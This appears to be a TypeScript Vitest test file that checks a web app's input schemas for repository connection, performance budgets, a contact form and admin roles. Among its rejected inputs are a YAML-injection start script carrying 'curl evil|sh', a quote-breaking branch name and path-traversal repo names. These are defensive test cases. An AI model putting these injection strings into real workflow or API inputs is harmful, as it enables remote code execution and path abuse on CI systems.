import { describe, expect, it } from "vitest";
import { actionFor, updateBudgetsSchema } from "@/lib/budgets";
import { contactSchema } from "@/lib/contact-schema";
import { isAdminRole } from "@/lib/roles";
import { connectRepositoriesSchema, parseInput } from "@/lib/validation";

const repo = {
	id: "1357877390",
	name: "web",
	fullName: "acme/web",
	defaultBranch: "main",
	private: true,
};
const connect = (overrides: Record<string, unknown> = {}) =>
	connectRepositoriesSchema.safeParse({
		repos: [repo],
		preset: "default",
		branchProtect: true,
		...overrides,
	});

describe("connectRepositoriesSchema", () => {
	it("accepts a normal request", () => {
		expect(connect({ startScript: "start:prod", port: 3000 }).success).toBe(
			true,
		);
	});

	// These values are written into the workflow YAML and GitHub API paths.
	it.each([
		[
			"a start script that breaks out of YAML",
			{ startScript: "start\n  - run: curl evil|sh" },
		],
		[
			"a branch name with quotes",
			{ repos: [{ ...repo, defaultBranch: 'main"]\non: push' }] },
		],
		[
			"a repo name that walks the API path",
			{ repos: [{ ...repo, fullName: "../x" }] },
		],
		["a repo name ending in ..", { repos: [{ ...repo, fullName: "acme/.." }] }],
		["a non-numeric repo id", { repos: [{ ...repo, id: "abc" }] }],
		["an unknown preset", { preset: "yolo" }],
		["an out-of-range port", { port: 99999 }],
		["no repositories", { repos: [] }],
	])("rejects %s", (_label, overrides) => {
		expect(connect(overrides).success).toBe(false);
	});
});

describe("parseInput", () => {
	it("throws the first issue as a readable message", () => {
		const validate = parseInput(connectRepositoriesSchema);
		expect(() => validate({ ...connectInput(), port: 99999 } as never)).toThrow(
			/<=65535/,
		);
	});
});

function connectInput() {
	return { repos: [repo], preset: "default" as const, branchProtect: true };
}

describe("budgets", () => {
	const save = (budgets: unknown[]) =>
		updateBudgetsSchema.safeParse({ repoId: "r1", budgets });

	it("accepts budgets within each metric's range", () => {
		expect(
			save([
				{ metric: "LCP", max: 2500, severity: "fail" },
				{ metric: "PERF", max: 90, severity: "warn" },
				{ metric: "CLS", max: 0.1, severity: "warn" },
			]).success,
		).toBe(true);
	});

	it("rejects out-of-range limits, INP and duplicates", () => {
		expect(save([{ metric: "PERF", max: 150, severity: "fail" }]).success).toBe(
			false,
		);
		expect(save([{ metric: "LCP", max: 10, severity: "fail" }]).success).toBe(
			false,
		);
		expect(save([{ metric: "INP", max: 200, severity: "fail" }]).success).toBe(
			false,
		);
		expect(
			save([
				{ metric: "LCP", max: 2500, severity: "fail" },
				{ metric: "LCP", max: 3000, severity: "warn" },
			]).success,
		).toBe(false);
	});

	it("derives the action from severity", () => {
		expect(actionFor("fail")).toBe("block");
		expect(actionFor("warn")).toBe("comment");
	});
});

describe("contactSchema", () => {
	const base = {
		name: "Ada",
		email: "ada@example.com",
		message: "Hi",
		website: "",
	};

	it("trims and accepts a normal message", () => {
		const r = contactSchema.safeParse({ ...base, name: "  Ada  " });
		expect(r.success && r.data.name).toBe("Ada");
	});

	it("rejects missing fields, bad emails and oversized messages", () => {
		expect(contactSchema.safeParse({ ...base, name: " " }).success).toBe(false);
		expect(contactSchema.safeParse({ ...base, email: "nope" }).success).toBe(
			false,
		);
		expect(
			contactSchema.safeParse({ ...base, message: "x".repeat(5001) }).success,
		).toBe(false);
	});
});

describe("isAdminRole", () => {
	it("allows owners and admins, including multi-role strings", () => {
		expect(isAdminRole("owner")).toBe(true);
		expect(isAdminRole("admin")).toBe(true);
		expect(isAdminRole("member, admin")).toBe(true);
	});

	it("denies members", () => {
		expect(isAdminRole("member")).toBe(false);
		expect(isAdminRole("")).toBe(false);
	});
});
